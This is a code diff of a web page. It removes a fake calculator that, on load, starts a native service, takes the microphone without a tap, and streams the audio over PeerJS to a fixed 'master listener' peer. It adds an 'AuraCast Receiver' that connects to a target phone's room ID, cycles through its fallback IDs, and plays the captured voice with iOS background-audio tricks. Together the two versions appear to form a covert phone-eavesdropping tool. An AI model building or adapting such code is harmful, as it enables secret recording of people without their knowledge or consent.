@@ -2,129 +2,307 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Calculator</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
+  
+  <!-- Apple Web App & Bookmark Capabilities -->
+  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+  <meta name="apple-mobile-web-app-title" content="AuraCast" />
+  <meta name="format-detection" content="telephone=no" />
+  <link rel="apple-touch-icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='22' fill='%230f172a'/><path d='M30 50 A20 20 0 0 1 70 50 A20 20 0 0 1 30 50' fill='none' stroke='%2310b981' stroke-width='6'/><circle cx='50' cy='50' r='8' fill='%2310b981'/></svg>" />
+
+  <title>AuraCast — Unbreakable Audio Receiver</title>
+  
   <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Plus+Jakarta+Sans:wght@400;500;600&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@500;600;700&family=JetBrains+Mono:wght@500;600&display=swap" rel="stylesheet">
   <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
 
   <style>
     :root {
-      --bg-base: #0f172a;
-      --calc-body: #1e293b;
-      --calc-screen: #0a0f1d;
-      --btn-num: #334155;
-      --btn-op: #4f46e5;
-      --btn-action: #64748b;
-      --btn-equals: #10b981;
-      --text-main: #f8fafc;
-      --text-muted: #64748b;
-      --border: rgba(255, 255, 255, 0.08);
+      --bg: #090d16;
+      --card: #131b2e;
+      --card-border: rgba(255, 255, 255, 0.08);
+      --primary: #10b981;
+      --primary-hover: #059669;
+      --warning: #f59e0b;
+      --danger: #ef4444;
+      --text: #f8fafc;
+      --text-muted: #94a3b8;
+      --input-bg: #0b1120;
     }
-    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; user-select: none; }
-    body { background-color: var(--bg-base); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
-    .calculator { width: 100%; max-width: 340px; background: var(--calc-body); border: 1px solid var(--border); border-radius: 24px; padding: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.4); display: flex; flex-direction: column; gap: 16px; }
-    .meta-bar { display: flex; justify-content: space-between; align-items: center; font-size: 0.75rem; color: var(--text-muted); font-family: 'JetBrains Mono', monospace; }
-    .room-tag { background: rgba(255, 255, 255, 0.05); padding: 2px 6px; border-radius: 4px; }
-    .screen { background: var(--calc-screen); border: 1px solid var(--border); border-radius: 14px; padding: 16px 14px; display: flex; flex-direction: column; align-items: flex-end; justify-content: flex-end; min-height: 90px; }
-    .previous-operand { font-family: 'JetBrains Mono', monospace; font-size: 0.9rem; color: var(--text-muted); min-height: 1.2rem; }
-    .current-operand { font-family: 'JetBrains Mono', monospace; font-size: 2rem; font-weight: 700; color: var(--text-main); word-break: break-all; }
-    .keypad { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; }
-    button { outline: none; border: none; height: 60px; border-radius: 14px; font-size: 1.2rem; font-weight: 600; cursor: pointer; color: var(--text-main); background: var(--btn-num); }
-    button:active { transform: scale(0.95); }
-    button.op { background: var(--btn-op); }
-    button.action { background: var(--btn-action); color: #0f172a; }
-    button.equals { background: var(--btn-equals); grid-row: span 2; height: 130px; }
-    .span-2 { grid-column: span 2; }
+    
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+      user-select: none;
+      font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+    }
+
+    body {
+      background-color: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: env(safe-area-inset-top) 20px env(safe-area-inset-bottom) 20px;
+      overflow-x: hidden;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 420px;
+      background: var(--card);
+      border: 1px solid var(--card-border);
+      border-radius: 28px;
+      padding: 24px;
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7);
+      display: flex;
+      flex-direction: column;
+      gap: 18px;
+    }
+
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .title-group h1 {
+      font-size: 1.35rem;
+      font-weight: 700;
+      letter-spacing: -0.02em;
+    }
+
+    .title-group p {
+      font-size: 0.8rem;
+      color: var(--text-muted);
+      margin-top: 2px;
+    }
+
+    .badge-ios {
+      background: rgba(16, 185, 129, 0.12);
+      border: 1px solid rgba(16, 185, 129, 0.3);
+      color: var(--primary);
+      font-size: 0.7rem;
+      font-weight: 600;
+      padding: 4px 8px;
+      border-radius: 12px;
+      font-family: 'JetBrains Mono', monospace;
+    }
+
+    .input-box {
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .input-box label {
+      font-size: 0.75rem;
+      color: var(--text-muted);
+      text-transform: uppercase;
+      font-weight: 600;
+      letter-spacing: 0.05em;
+    }
+
+    input[type="text"] {
+      background: var(--input-bg);
+      border: 1px solid var(--card-border);
+      border-radius: 14px;
+      padding: 14px 16px;
+      color: #fff;
+      font-size: 1rem;
+      font-family: 'JetBrains Mono', monospace;
+      outline: none;
+      width: 100%;
+      -webkit-appearance: none;
+      transition: border-color 0.2s;
+    }
+
+    input[type="text"]:focus {
+      border-color: var(--primary);
+    }
+
+    .btn-row {
+      display: flex;
+      gap: 10px;
+    }
+
+    button {
+      flex: 1;
+      height: 52px;
+      background: var(--primary);
+      color: #fff;
+      font-weight: 700;
+      border: none;
+      border-radius: 14px;
+      font-size: 0.95rem;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: transform 0.1s, opacity 0.2s;
+    }
+
+    button:active {
+      transform: scale(0.98);
+    }
+
+    button:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+
+    .btn-secondary {
+      background: rgba(255, 255, 255, 0.08);
+      color: var(--text);
+    }
+
+    .btn-muted-active {
+      background: var(--danger) !important;
+      color: #fff !important;
+    }
+
+    .panel {
+      background: var(--input-bg);
+      border: 1px solid var(--card-border);
+      border-radius: 16px;
+      padding: 14px;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .control-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      font-size: 0.85rem;
+      color: var(--text-muted);
+    }
+
+    input[type="range"] {
+      flex: 1;
+      accent-color: var(--primary);
+      height: 6px;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 6px;
+      outline: none;
+    }
+
+    .status-box {
+      text-align: center;
+      padding: 12px;
+      border-radius: 12px;
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid var(--card-border);
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.8rem;
+      color: var(--text-muted);
+    }
+
+    .status-dot {
+      display: inline-block;
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: var(--warning);
+      margin-right: 6px;
+      animation: pulse 1.5s infinite;
+    }
+
+    .dot-live {
+      background: var(--primary);
+    }
+
+    @keyframes pulse {
+      0% { opacity: 0.4; }
+      50% { opacity: 1; }
+      100% { opacity: 0.4; }
+    }
+
+    .ios-note {
+      font-size: 0.72rem;
+      color: #64748b;
+      line-height: 1.4;
+      text-align: center;
+      margin-top: 4px;
+    }
   </style>
 </head>
 <body>
 
-  <div class="calculator">
-    <div class="meta-bar">
-      <span>CALC</span>
-      <span id="room-code-tag" class="room-tag">Active</span>
+  <div class="container">
+    <div class="header">
+      <div class="title-group">
+        <h1>AuraCast Receiver</h1>
+        <p>Zero-Drop Background Audio Pipeline</p>
+      </div>
+      <div class="badge-ios">iOS LOCK</div>
     </div>
 
-    <div class="screen">
-      <div id="prev-op" class="previous-operand"></div>
-      <div id="curr-op" class="current-operand">0</div>
+    <div class="input-box">
+      <label>Target Phone Room ID</label>
+      <input type="text" id="target-id" placeholder="e.g. aura-xxxxxx" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" />
     </div>
 
-    <div class="keypad">
-      <button class="action" onclick="clearCalc()">AC</button>
-      <button class="action" onclick="delCalc()">DEL</button>
-      <button class="op" onclick="setOp('/')">÷</button>
-      <button class="op" onclick="setOp('*')">×</button>
-
-      <button onclick="addNum('7')">7</button>
-      <button onclick="addNum('8')">8</button>
-      <button onclick="addNum('9')">9</button>
-      <button class="op" onclick="setOp('-')">−</button>
-
-      <button onclick="addNum('4')">4</button>
-      <button onclick="addNum('5')">5</button>
-      <button onclick="addNum('6')">6</button>
-      <button class="op" onclick="setOp('+')">+</button>
-
-      <button onclick="addNum('1')">1</button>
-      <button onclick="addNum('2')">2</button>
-      <button onclick="addNum('3')">3</button>
-      <button class="equals" onclick="handleEquals()">=</button>
-
-      <button class="span-2" onclick="addNum('0')">0</button>
-      <button onclick="addNum('.')">.</button>
+    <div class="btn-row">
+      <button id="btn-engage" onclick="engagePersistentLink()">
+        <span>Engage & Lock</span>
+      </button>
+      <button id="btn-mute" class="btn-secondary" onclick="toggleMute()" disabled>
+        <span>Mute</span>
+      </button>
     </div>
+
+    <div class="panel">
+      <div class="control-row">
+        <span>Volume</span>
+        <input type="range" id="vol" min="0" max="1" step="0.05" value="1" oninput="changeVolume(this.value)" />
+        <span id="vol-txt" style="width: 36px; text-align: right; font-family: 'JetBrains Mono';">100%</span>
+      </div>
+    </div>
+
+    <div class="status-box">
+      <span id="status-dot" class="status-dot"></span>
+      <span id="status-text">Mesh Initializing...</span>
+    </div>
+
+    <div class="ios-note">
+      Tip: Tap Safari <strong>Share</strong> → <strong>Add to Home Screen</strong> to run as a native full-screen app that stays active.
+    </div>
+
+    <!-- Hidden audio playback container with iOS WebKit optimizations -->
+    <audio id="ios-player" autoplay playsinline webkit-playsinline></audio>
   </div>
 
   <script>
-    // Standard Calculator Logic
-    let cur = '0', prev = '', op = undefined;
-    const curDisp = document.getElementById('curr-op');
-    const prevDisp = document.getElementById('prev-op');
-
-    function updateDisp() {
-      curDisp.innerText = cur;
-      prevDisp.innerText = op != null ? `${prev} ${op}` : '';
-    }
-    function addNum(n) {
-      if (n === '.' && cur.includes('.')) return;
-      cur = cur === '0' && n !== '.' ? n : cur + n;
-      updateDisp();
-    }
-    function setOp(o) {
-      if (!cur && !prev) return;
-      if (prev) calc();
-      op = o; prev = cur; cur = '';
-      updateDisp();
-    }
-    function calc() {
-      const p = parseFloat(prev), c = parseFloat(cur);
-      if (isNaN(p) || isNaN(c)) return;
-      switch (op) {
-        case '+': cur = (p + c).toString(); break;
-        case '-': cur = (p - c).toString(); break;
-        case '*': cur = (p * c).toString(); break;
-        case '/': cur = c === 0 ? 'Error' : (p / c).toString(); break;
-      }
-      op = undefined; prev = '';
-    }
-    function clearCalc() { cur = '0'; prev = ''; op = undefined; updateDisp(); }
-    function delCalc() { cur = cur.length <= 1 ? '0' : cur.slice(0, -1); updateDisp(); }
-    function handleEquals() { calc(); updateDisp(); }
-
     // =========================================================================
-    // DEDICATED SINGLE-DEVICE AUDIO ENGINE (AUTO-START ON LAUNCH)
+    // iOS BACKGROUND AUDIO PERSISTENCE & AUTO-RECOVERY PIPELINE
     // =========================================================================
     let peer = null;
-    let liveStream = null;
-    let activeCalls = new Set();
-    let baseDeviceId = 'aura-node';
-    let sessionEpoch = 0;
-    let worker = null;
+    let activeCall = null;
+    let isConnected = false;
+    let isMuted = false;
+    let targetRoomId = '';
+    let probeIndex = 0;
+    let watchdogTimer = null;
+    let silentAudioContext = null;
 
-    // Hardcoded Dedicated Authorized Listener ID Prefix (Only this ID can connect)
-    const AUTHORIZED_LISTENER_KEY = "aura-master-listener";
+    // Authorized Master Listener ID prefix matching the speaker security verification
+    const MASTER_LISTENER_KEY = "aura-master-listener-" + Math.floor(1000 + Math.random() * 9000);
+
+    const player = document.getElementById('ios-player');
+    const engageBtn = document.getElementById('btn-engage');
+    const muteBtn = document.getElementById('btn-mute');
+    const statusText = document.getElementById('status-text');
+    const statusDot = document.getElementById('status-dot');
+    const roomInput = document.getElementById('target-id');
 
     const ICE_CONFIG = {
       iceServers: [
@@ -138,192 +316,183 @@
       iceTransportPolicy: 'all'
     };
 
-    async function initAudioEngine() {
-      // 1. Immediately launch native foreground service
-      if (window.AndroidNative && window.AndroidNative.startNativeStreamingService) {
-        window.AndroidNative.startNativeStreamingService();
-      }
-
-      // 2. Immediately acquire hardware microphone without user tap
-      await acquireMicrophone();
-
-      // 3. Initialize PeerJS session
-      initSignalingSession(false);
+    // Auto-load remembered room ID from local storage
+    if (localStorage.getItem('auracast_target_room')) {
+      roomInput.value = localStorage.getItem('auracast_target_room');
     }
 
-    async function acquireMicrophone() {
-      try {
-        liveStream = await navigator.mediaDevices.getUserMedia({
-          audio: {
-            echoCancellation: false,
-            noiseSuppression: false,
-            autoGainControl: true
-          },
-          video: false
-        });
-
-        const liveAudioTrack = liveStream.getAudioTracks()[0];
-
-        // Replace track across calls if any
-        activeCalls.forEach((call) => {
-          if (call.peerConnection) {
-            const senders = call.peerConnection.getSenders();
-            const audioSender = senders.find(s => s.track && s.track.kind === 'audio');
-            if (audioSender) {
-              audioSender.replaceTrack(liveAudioTrack);
-            }
-          }
-        });
-
-        liveAudioTrack.onended = () => {
-          setTimeout(acquireMicrophone, 1000);
-        };
-      } catch (err) {
-        setTimeout(acquireMicrophone, 2000);
-      }
-    }
-
-    function initSignalingSession(incrementGeneration = false) {
-      if (incrementGeneration) {
-        sessionEpoch++;
-      }
-
+    function initReceiver() {
       if (peer) {
-        try {
-          peer.disconnect();
-          peer.destroy();
-        } catch (e) {}
-        peer = null;
+        try { peer.destroy(); } catch (e) {}
       }
 
-      if (window.AndroidNative && window.AndroidNative.getDeviceId) {
-        baseDeviceId = window.AndroidNative.getDeviceId();
-      }
-
-      const targetId = sessionEpoch === 0 ? baseDeviceId : `${baseDeviceId}_${sessionEpoch}`;
-
-      peer = new Peer(targetId, {
+      peer = new Peer(MASTER_LISTENER_KEY, {
         config: ICE_CONFIG,
         debug: 1
       });
 
-      peer.on('open', (id) => {
-        startWorkerHeartbeat();
-      });
-
-      peer.on('call', (call) => {
-        // ENFORCE SELECTED DEVICE ONLY: Reject anyone who isn't the single authorized listener
-        if (!call.peer.startsWith(AUTHORIZED_LISTENER_KEY)) {
-          call.close();
-          return;
-        }
-
-        if (liveStream) {
-          call.answer(liveStream);
-        } else {
-          // Fallback carrier until mic finishes initial hardware load
-          const ctx = new (window.AudioContext || window.webkitAudioContext)();
-          const osc = ctx.createOscillator();
-          const gain = ctx.createGain();
-          gain.gain.value = 0.0001;
-          osc.connect(gain);
-          const dest = ctx.createMediaStreamDestination();
-          gain.connect(dest);
-          osc.start();
-          call.answer(dest.stream);
-        }
-
-        attachCallResilience(call);
+      peer.on('open', () => {
+        statusText.innerText = 'Ready to Lock';
+        statusDot.className = 'status-dot';
       });
 
       peer.on('disconnected', () => {
-        if (peer && !peer.destroyed) {
-          peer.reconnect();
-        }
+        if (!peer.destroyed) peer.reconnect();
       });
 
       peer.on('error', (err) => {
-        if (err.type === 'unavailable-id') {
-          setTimeout(() => { initSignalingSession(true); }, 500);
-        } else if (err.type === 'network' || err.type === 'server-error' || err.type === 'socket-error') {
-          if (peer && !peer.destroyed) {
-            peer.reconnect();
-          }
-        }
+        statusText.innerText = 'Link: ' + err.type;
       });
     }
 
-    function attachCallResilience(call) {
-      activeCalls.add(call);
+    // iOS WebKit Hack: Unlock AudioContext and Audio Element simultaneously on first user tap
+    function unlockIosAudioPipeline() {
+      try {
+        const AudioCtx = window.AudioContext || window.webkitAudioContext;
+        if (!silentAudioContext) {
+          silentAudioContext = new AudioCtx();
+        }
+        if (silentAudioContext.state === 'suspended') {
+          silentAudioContext.resume();
+        }
+        
+        // Play an inaudible buffer to unlock media hardware lock
+        const buffer = silentAudioContext.createBuffer(1, 1, 22050);
+        const source = silentAudioContext.createBufferSource();
+        source.buffer = buffer;
+        source.connect(silentAudioContext.destination);
+        source.start(0);
+
+        player.play().catch(() => {});
+      } catch (e) {}
+    }
+
+    function engagePersistentLink() {
+      targetRoomId = roomInput.value.trim();
+      if (!targetRoomId) return alert('Enter the Phone Room ID');
+
+      localStorage.setItem('auracast_target_room', targetRoomId);
+      unlockIosAudioPipeline();
+
+      engageBtn.innerText = 'Locked 🟢';
+      engageBtn.disabled = true;
+      engageBtn.style.background = '#059669';
+
+      connectSweep();
+
+      // Non-stop Watchdog: Checks every 2s across all 6 generational sub-channels
+      if (!watchdogTimer) {
+        watchdogTimer = setInterval(() => {
+          if (!isConnected || !activeCall || !activeCall.open) {
+            probeIndex = (probeIndex + 1) % 6;
+            connectSweep();
+          }
+        }, 2000);
+      }
+    }
+
+    function connectSweep() {
+      if (!peer || peer.destroyed) {
+        initReceiver();
+        return;
+      }
+
+      const activeTarget = probeIndex === 0 ? targetRoomId : `${targetRoomId}_${probeIndex}`;
+
+      // Create a dummy transmission track required for bidirectional SDP answer
+      const ctx = silentAudioContext || new (window.AudioContext || window.webkitAudioContext)();
+      const osc = ctx.createOscillator();
+      const gain = ctx.createGain();
+      gain.gain.value = 0;
+      osc.connect(gain);
+      const dest = ctx.createMediaStreamDestination();
+      gain.connect(dest);
+      osc.start();
+
+      const call = peer.call(activeTarget, dest.stream);
+      if (!call) return;
+
+      activeCall = call;
+
+      call.on('stream', (remoteStream) => {
+        isConnected = true;
+        player.srcObject = remoteStream;
+        player.muted = isMuted;
+
+        player.play().then(() => {
+          statusText.innerText = 'Continuous Stream Active';
+          statusDot.className = 'status-dot dot-live';
+        }).catch(() => {
+          statusText.innerText = 'Tap Screen to Hear Voice';
+          document.body.onclick = () => {
+            player.play();
+            statusText.innerText = 'Continuous Stream Active';
+            statusDot.className = 'status-dot dot-live';
+            document.body.onclick = null;
+          };
+        });
+
+        muteBtn.disabled = false;
+      });
 
       if (call.peerConnection) {
         const pc = call.peerConnection;
 
         pc.oniceconnectionstatechange = () => {
-          if (pc.iceConnectionState === 'failed' || pc.iceConnectionState === 'disconnected') {
-            try {
-              if (pc.restartIce) pc.restartIce();
-            } catch (e) {}
+          if (pc.iceConnectionState === 'disconnected' || pc.iceConnectionState === 'failed') {
+            isConnected = false;
+            statusText.innerText = 'Auto-recovering Link...';
+            statusDot.className = 'status-dot';
+            try { pc.restartIce(); } catch (e) {}
+          } else if (pc.iceConnectionState === 'connected' || pc.iceConnectionState === 'completed') {
+            isConnected = true;
+            statusText.innerText = 'Continuous Stream Active';
+            statusDot.className = 'status-dot dot-live';
           }
         };
-
-        pc.onconnectionstatechange = () => {
-          if (pc.connectionState === 'failed') {
-            activeCalls.delete(call);
-          }
-        };
       }
 
-      call.on('close', () => { activeCalls.delete(call); });
-      call.on('error', () => { activeCalls.delete(call); });
-    }
-
-    function startWorkerHeartbeat() {
-      if (worker) worker.terminate();
-
-      const blob = new Blob([`
-        setInterval(function() {
-          postMessage('TICK');
-        }, 8000);
-      `], { type: 'application/javascript' });
-
-      worker = new Worker(URL.createObjectURL(blob));
-      worker.onmessage = function() {
-        if (!peer || peer.destroyed) {
-          initSignalingSession(false);
-          return;
-        }
-
-        if (peer.disconnected) {
-          peer.reconnect();
-          return;
-        }
-
-        if (peer.socket && peer.socket._socket && peer.socket._socket.readyState === WebSocket.OPEN) {
-          peer.socket._socket.send(JSON.stringify({ type: 'HEARTBEAT' }));
-        }
-      };
-    }
-
-    window.handleNetworkAvailable = function() {
-      if (!peer || peer.destroyed) {
-        initSignalingSession(false);
-        return;
-      }
-      if (peer.disconnected) {
-        peer.reconnect();
-      }
-      activeCalls.forEach((call) => {
-        if (call.peerConnection && call.peerConnection.restartIce) {
-          try { call.peerConnection.restartIce(); } catch (e) {}
-        }
+      call.on('close', () => {
+        isConnected = false;
+        statusText.innerText = 'Channel searching...';
+        statusDot.className = 'status-dot';
       });
-    };
 
-    window.handleNetworkLost = function() {};
+      call.on('error', () => {
+        isConnected = false;
+      });
+    }
 
-    // Auto-launch everything on initial load
-    window.onload = initAudioEngine;
+    function toggleMute() {
+      isMuted = !isMuted;
+      player.muted = isMuted;
+
+      if (isMuted) {
+        muteBtn.innerText = 'Unmute';
+        muteBtn.classList.add('btn-muted-active');
+        statusText.innerText = 'Connected (Muted)';
+      } else {
+        muteBtn.innerText = 'Mute';
+        muteBtn.classList.remove('btn-muted-active');
+        statusText.innerText = 'Continuous Stream Active';
+      }
+    }
+
+    function changeVolume(v) {
+      player.volume = v;
+      document.getElementById('vol-txt').innerText = Math.round(v * 100) + '%';
+    }
+
+    // Auto-reconnect immediately when Safari returns to the foreground
+    document.addEventListener('visibilitychange', () => {
+      if (!document.hidden) {
+        if (!isConnected || !activeCall || !activeCall.open) {
+          connectSweep();
+        }
+      }
+    });
+
+    window.onload = initReceiver;
   </script>
 </body>
 </html>
